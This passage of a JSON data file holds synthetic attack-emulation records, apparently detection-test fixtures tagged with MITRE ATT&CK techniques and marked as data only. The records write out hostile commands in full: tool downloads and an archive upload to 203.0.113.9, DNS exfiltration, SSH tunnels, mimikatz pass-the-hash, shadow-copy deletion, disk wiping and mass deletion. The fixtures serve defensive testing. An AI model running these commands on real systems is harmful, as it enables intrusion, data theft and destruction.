+  {
+   "id": "emu-t1046-net-scan",
+   "name": "Port scan an internal range",
+   "description": "Synthetic event sequence emulating T1046: port scan an internal range. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1046"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/nmap",
+     "command": "nmap -sS -p 1-1024 10.0.0.0/24",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1046"
+   ]
+  },
+  {
+   "id": "emu-t1033-whoami-id",
+   "name": "Identify current user and privileges",
+   "description": "Synthetic event sequence emulating T1033: identify current user and privileges. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1033"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\whoami.exe",
+     "command": "whoami /all",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1033"
+   ]
+  },
+  {
+   "id": "emu-t1082-sysinfo-win",
+   "name": "systeminfo collection",
+   "description": "Synthetic event sequence emulating T1082: systeminfo collection. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1082"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\systeminfo.exe",
+     "command": "systeminfo",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1082"
+   ]
+  },
+  {
+   "id": "emu-t1018-remote-sys-discovery",
+   "name": "Ping sweep and net view",
+   "description": "Synthetic event sequence emulating T1018: ping sweep and net view. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1018"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\net.exe",
+     "command": "net view /domain",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1018"
+   ]
+  },
+  {
+   "id": "emu-t1135-share-discovery",
+   "name": "List SMB shares",
+   "description": "Synthetic event sequence emulating T1135: list smb shares. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1135"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/smbclient",
+     "command": "smbclient -L //10.0.0.5 -N",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1135"
+   ]
+  },
+  {
+   "id": "emu-t1087-004-cloud-account-enum",
+   "name": "Enumerate cloud users",
+   "description": "Synthetic event sequence emulating T1087.004: enumerate cloud users. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1087.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws iam list-users",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1087.004"
+   ]
+  },
+  {
+   "id": "emu-t1580-cloud-infra-enum",
+   "name": "Enumerate cloud compute",
+   "description": "Synthetic event sequence emulating T1580: enumerate cloud compute. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1580"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws ec2 describe-instances",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1580"
+   ]
+  },
+  {
+   "id": "emu-t1613-k8s-resource-enum",
+   "name": "List cluster resources",
+   "description": "Synthetic event sequence emulating T1613: list cluster resources. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1613"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/kubectl",
+     "command": "kubectl get pods --all-namespaces -o wide",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1613"
+   ]
+  },
+  {
+   "id": "emu-t1518-001-security-sw-discovery",
+   "name": "List installed security products",
+   "description": "Synthetic event sequence emulating T1518.001: list installed security products. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1518.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+     "command": "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1518.001"
+   ]
+  },
+  {
+   "id": "emu-t1083-file-discovery",
+   "name": "Search the disk for interesting files",
+   "description": "Synthetic event sequence emulating T1083: search the disk for interesting files. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1083"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/find",
+     "command": "find / -type f \\( -name '*.kdbx' -o -name '*.xlsx' \\) 2>/dev/null",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1083"
+   ]
+  },
+  {
+   "id": "emu-t1569-002-psexec-service",
+   "name": "Remote service execution",
+   "description": "Synthetic event sequence emulating T1569.002: remote service execution. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1569.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Tools\\PsExec.exe",
+     "command": "PsExec.exe \\\\10.0.0.9 -s cmd.exe",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1569.002"
+   ]
+  },
+  {
+   "id": "emu-t1021-002-smb-admin-share",
+   "name": "Copy a tool to an admin share",
+   "description": "Synthetic event sequence emulating T1021.002: copy a tool to an admin share. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1021.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\cmd.exe",
+     "command": "cmd.exe /c copy C:\\Temp\\a.exe \\\\10.0.0.9\\C$\\Windows\\Temp\\a.exe",
+     "parent_exe": "C:\\Windows\\explorer.exe"
+    }
+   ],
+   "expect": [
+    "T1021.002"
+   ]
+  },
+  {
+   "id": "emu-t1021-006-winrm-invoke",
+   "name": "Remote PowerShell session",
+   "description": "Synthetic event sequence emulating T1021.006: remote powershell session. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1021.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command": "powershell Invoke-Command -ComputerName srv02 -ScriptBlock { whoami }",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1021.006"
+   ]
+  },
+  {
+   "id": "emu-t1021-004-ssh-pivot",
+   "name": "SSH with a stolen key to another host",
+   "description": "Synthetic event sequence emulating T1021.004: ssh with a stolen key to another host. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1021.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/ssh",
+     "command": "ssh -i /tmp/.k -o StrictHostKeyChecking=no root@10.0.0.12 'id'",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1021.004"
+   ]
+  },
+  {
+   "id": "emu-t1550-002-pass-the-hash",
+   "name": "Pass the hash with mimikatz",
+   "description": "Synthetic event sequence emulating T1550.002: pass the hash with mimikatz. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1550.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Tools\\mimikatz.exe",
+     "command": "mimikatz.exe \"sekurlsa::pth /user:admin /domain:corp /ntlm:8846f7eaee8fb117ad06bdd830b7586c\" exit",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1550.002"
+   ]
+  },
+  {
+   "id": "emu-t1021-001-rdp-enable",
+   "name": "Enable remote desktop",
+   "description": "Synthetic event sequence emulating T1021.001: enable remote desktop. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1021.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "registry",
+     "key": "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server",
+     "operation": "set",
+     "value_name": "fDenyTSConnections",
+     "value_data": "0"
+    }
+   ],
+   "expect": [
+    "T1021.001"
+   ]
+  },
+  {
+   "id": "emu-t1570-scp-tool-transfer",
+   "name": "Copy a tool to a peer",
+   "description": "Synthetic event sequence emulating T1570: copy a tool to a peer. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1570"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/scp",
+     "command": "scp /tmp/.k root@10.0.0.12:/tmp/.k",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1570"
+   ]
+  },
+  {
+   "id": "emu-t1021-005-vnc-enable",
+   "name": "Enable screen sharing",
+   "description": "Synthetic event sequence emulating T1021.005: enable screen sharing. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1021.005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart",
+     "command": "kickstart -activate -configure -access -on -privs -all -restart -agent",
+     "parent_exe": "/bin/zsh"
+    }
+   ],
+   "expect": [
+    "T1021.005"
+   ]
+  },
+  {
+   "id": "emu-t1021-003-dcom-lateral",
+   "name": "DCOM object instantiation on a remote host",
+   "description": "Synthetic event sequence emulating T1021.003: dcom object instantiation on a remote host. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1021.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command": "powershell [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','10.0.0.9'))",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1021.003"
+   ]
+  },
+  {
+   "id": "emu-t1560-001-archive-staging",
+   "name": "Archive a data directory",
+   "description": "Synthetic event sequence emulating T1560.001: archive a data directory. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1560.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/tar",
+     "command": "tar czf /tmp/.d.tgz /home/ann/Documents /var/lib/db",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1560.001"
+   ]
+  },
+  {
+   "id": "emu-t1560-001-rar-password",
+   "name": "Password protected archive",
+   "description": "Synthetic event sequence emulating T1560.001: password protected archive. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1560.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Program Files\\WinRAR\\rar.exe",
+     "command": "rar a -hpS3cret C:\\Users\\Public\\d.rar C:\\Users\\ann\\Documents\\",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1560.001"
+   ]
+  },
+  {
+   "id": "emu-t1113-screen-capture",
+   "name": "Silent screenshots",
+   "description": "Synthetic event sequence emulating T1113: silent screenshots. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1113"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/screencapture",
+     "command": "screencapture -x /tmp/s.png",
+     "parent_exe": "/bin/zsh"
+    }
+   ],
+   "expect": [
+    "T1113"
+   ]
+  },
+  {
+   "id": "emu-t1115-clipboard-read",
+   "name": "Read the pasteboard",
+   "description": "Synthetic event sequence emulating T1115: read the pasteboard. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1115"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/pbpaste",
+     "command": "pbpaste",
+     "parent_exe": "/bin/zsh"
+    }
+   ],
+   "expect": [
+    "T1115"
+   ]
+  },
+  {
+   "id": "emu-t1123-audio-record",
+   "name": "Record microphone input",
+   "description": "Synthetic event sequence emulating T1123: record microphone input. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1123"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/arecord",
+     "command": "arecord -d 600 -f cd /tmp/m.wav",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1123"
+   ]
+  },
+  {
+   "id": "emu-t1530-cloud-bucket-read",
+   "name": "Bulk object download from a bucket",
+   "description": "Synthetic event sequence emulating T1530: bulk object download from a bucket. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1530"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws s3 sync s3://corp-finance /tmp/loot",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1530"
+   ]
+  },
+  {
+   "id": "emu-t1567-002-exfil-rclone",
+   "name": "Sync files to cloud storage",
+   "description": "Synthetic event sequence emulating T1567.002: sync files to cloud storage. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1567.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/rclone",
+     "command": "rclone copy /srv/data remote:exfil --transfer 8",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1567.002"
+   ]
+  },
+  {
+   "id": "emu-t1048-exfil-curl-upload",
+   "name": "Upload an archive over HTTP",
+   "description": "Synthetic event sequence emulating T1048: upload an archive over http. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1048"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl -T /tmp/.d.tgz http://203.0.113.9/up",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1048"
+   ]
+  },
+  {
+   "id": "emu-t1048-003-dns-exfil",
+   "name": "Data encoded in DNS labels",
+   "description": "Synthetic event sequence emulating T1048.003: data encoded in dns labels. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1048.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "dns",
+     "query": "a1b2c3d4e5f6071800000000.t.exfil-dns.example",
+     "qtype": "TXT"
+    },
+    {
+     "type": "dns",
+     "query": "a1b2c3d4e5f6071811111111.t.exfil-dns.example",
+     "qtype": "TXT"
+    },
+    {
+     "type": "dns",
+     "query": "a1b2c3d4e5f6071822222222.t.exfil-dns.example",
+     "qtype": "TXT"
+    },
+    {
+     "type": "dns",
+     "query": "a1b2c3d4e5f6071833333333.t.exfil-dns.example",
+     "qtype": "TXT"
+    },
+    {
+     "type": "dns",
+     "query": "a1b2c3d4e5f6071844444444.t.exfil-dns.example",
+     "qtype": "TXT"
+    },
+    {
+     "type": "dns",
+     "query": "a1b2c3d4e5f6071855555555.t.exfil-dns.example",
+     "qtype": "TXT"
+    }
+   ],
+   "expect": [
+    "T1048.003"
+   ]
+  },
+  {
+   "id": "emu-t1114-001-mail-collect",
+   "name": "Copy local mail spools",
+   "description": "Synthetic event sequence emulating T1114.001: copy local mail spools. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1114.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/cp",
+     "command": "cp -r /home/ann/.thunderbird /tmp/mail",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1114.001"
+   ]
+  },
+  {
+   "id": "emu-t1074-001-local-data-stage",
+   "name": "Stage files under /tmp",
+   "description": "Synthetic event sequence emulating T1074.001: stage files under /tmp. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1074.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/cp",
+     "command": "cp -r /var/lib/mysql/backup /tmp/.stage",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1074.001"
+   ]
+  },
+  {
+   "id": "emu-t1537-transfer-cloud-acct",
+   "name": "Share a snapshot with another account",
+   "description": "Synthetic event sequence emulating T1537: share a snapshot with another account. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1537"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws ec2 modify-snapshot-attribute --snapshot-id snap-0abc --attribute createVolumePermission --operation-type add --user-ids 123456789012",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1537"
+   ]
+  },
+  {
+   "id": "emu-t1105-ingress-wget",
+   "name": "Fetch a tool into /tmp",
+   "description": "Synthetic event sequence emulating T1105: fetch a tool into /tmp. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1105"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/wget",
+     "command": "wget http://203.0.113.9/agent -O /tmp/agent",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1105"
+   ]
+  },
+  {
+   "id": "emu-t1105-ingress-certutil",
+   "name": "certutil urlcache fetch",
+   "description": "Synthetic event sequence emulating T1105: certutil urlcache fetch. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1105"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\certutil.exe",
+     "command": "certutil -urlcache -split -f http://203.0.113.9/a.exe C:\\Users\\Public\\a.exe",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1105"
+   ]
+  },
+  {
+   "id": "emu-t1219-remote-access-tool",
+   "name": "Install a remote administration tool silently",
+   "description": "Synthetic event sequence emulating T1219: install a remote administration tool silently. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1219"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Users\\ann\\Downloads\\AnyDesk.exe",
+     "command": "AnyDesk.exe --install C:\\ProgramData\\AnyDesk --silent --start-with-win",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1219"
+   ]
+  },
+  {
+   "id": "emu-t1572-ssh-tunnel",
+   "name": "SSH reverse port forward",
+   "description": "Synthetic event sequence emulating T1572: ssh reverse port forward. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1572"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/ssh",
+     "command": "ssh -N -R 8080:127.0.0.1:22 tun@203.0.113.9",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1572"
+   ]
+  },
+  {
+   "id": "emu-t1090-socks-proxy",
+   "name": "Dynamic SOCKS proxy",
+   "description": "Synthetic event sequence emulating T1090: dynamic socks proxy. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1090"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/ssh",
+     "command": "ssh -D 1080 -N user@203.0.113.9",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1090"
+   ]
+  },
+  {
+   "id": "emu-t1095-socat-relay",
+   "name": "socat relay over a raw TCP port",
+   "description": "Synthetic event sequence emulating T1095: socat relay over a raw tcp port. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1095"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/socat",
+     "command": "socat TCP-LISTEN:9001,fork TCP:203.0.113.9:443",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1095"
+   ]
+  },
+  {
+   "id": "emu-t1071-004-dns-tunnel-tool",
+   "name": "Tunnel tool over DNS",
+   "description": "Synthetic event sequence emulating T1071.004: tunnel tool over dns. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1071.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/iodine",
+     "command": "iodine -f -P secret 203.0.113.9 t.tunnel.example",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1071.004"
+   ]
+  },
+  {
+   "id": "emu-t1568-002-dga-queries",
+   "name": "Algorithmic domain lookups",
+   "description": "Synthetic event sequence emulating T1568.002: algorithmic domain lookups. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1568.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "dns",
+     "query": "xkqzjvpwhtmrb.top",
+     "qtype": "A"
+    },
+    {
+     "type": "dns",
+     "query": "qpzmwvxltkrjh.top",
+     "qtype": "A"
+    },
+    {
+     "type": "dns",
+     "query": "jvtxkqzmpwlrh.top",
+     "qtype": "A"
+    },
+    {
+     "type": "dns",
+     "query": "hmrqwjzxvtpkl.top",
+     "qtype": "A"
+    }
+   ],
+   "expect": [
+    "T1568.002"
+   ]
+  },
+  {
+   "id": "emu-t1102-001-dead-drop-resolver",
+   "name": "TXT lookup for a dead drop",
+   "description": "Synthetic event sequence emulating T1102.001: txt lookup for a dead drop. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1102.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "dns",
+     "query": "pastebin-raw.example",
+     "qtype": "TXT"
+    }
+   ],
+   "expect": [
+    "T1102.001"
+   ]
+  },
+  {
+   "id": "emu-t1571-nonstd-port-beacon",
+   "name": "Outbound beacon on an unusual port",
+   "description": "Synthetic event sequence emulating T1571: outbound beacon on an unusual port. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1571"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "network",
+     "destination": "203.0.113.9:4444"
+    },
+    {
+     "type": "network",
+     "destination": "203.0.113.9:4444"
+    }
+   ],
+   "expect": [
+    "T1571"
+   ]
+  },
+  {
+   "id": "emu-t1496-miner-pool",
+   "name": "Cryptominer contacting a pool",
+   "description": "Synthetic event sequence emulating T1496: cryptominer contacting a pool. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1496"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/tmp/xmrig",
+     "command": "xmrig -o stratum+tcp://pool.minexmr.example:4444 -u wallet -p x",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1496"
+   ]
+  },
+  {
+   "id": "emu-t1490-vss-delete",
+   "name": "Delete shadow copies",
+   "description": "Synthetic event sequence emulating T1490: delete shadow copies. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1490"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\vssadmin.exe",
+     "command": "vssadmin delete shadows /all /quiet",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1490"
+   ]
+  },
+  {
+   "id": "emu-t1490-bcdedit-recovery",
+   "name": "Disable recovery mode",
+   "description": "Synthetic event sequence emulating T1490: disable recovery mode. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1490"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\bcdedit.exe",
+     "command": "bcdedit /set {default} recoveryenabled No",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1490"
+   ]
+  },
+  {
+   "id": "emu-t1561-001-dd-wipe",
+   "name": "Overwrite a disk with zeros",
+   "description": "Synthetic event sequence emulating T1561.001: overwrite a disk with zeros. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1561.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/dd",
+     "command": "dd if=/dev/zero of=/dev/sda bs=1M",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1561.001"
+   ]
+  },
+  {
+   "id": "emu-t1485-rm-rf-root",
+   "name": "Recursive deletion of data",
+   "description": "Synthetic event sequence emulating T1485: recursive deletion of data. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1485"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/rm",
+     "command": "rm -rf /var/lib/postgresql /srv/backups",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1485"
+   ]
+  },
+  {
+   "id": "emu-t1489-service-stop-db",
+   "name": "Stop database and backup services",
+   "description": "Synthetic event sequence emulating T1489: stop database and backup services. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1489"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\net.exe",
+     "command": "net stop MSSQLSERVER /y",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1489"
+   ]
+  },
+  {
+   "id": "emu-t1529-shutdown-now",
+   "name": "Forced shutdown",
+   "description": "Synthetic event sequence emulating T1529: forced shutdown. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1529"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/sbin/shutdown",
+     "command": "shutdown -h now",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1529"
+   ]
+  },
+  {
+   "id": "emu-t1486-ransom-note",
+   "name": "Ransom note dropped across directories",
+   "description": "Synthetic event sequence emulating T1486: ransom note dropped across directories. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1486"
+   ],
+   "benign": false,
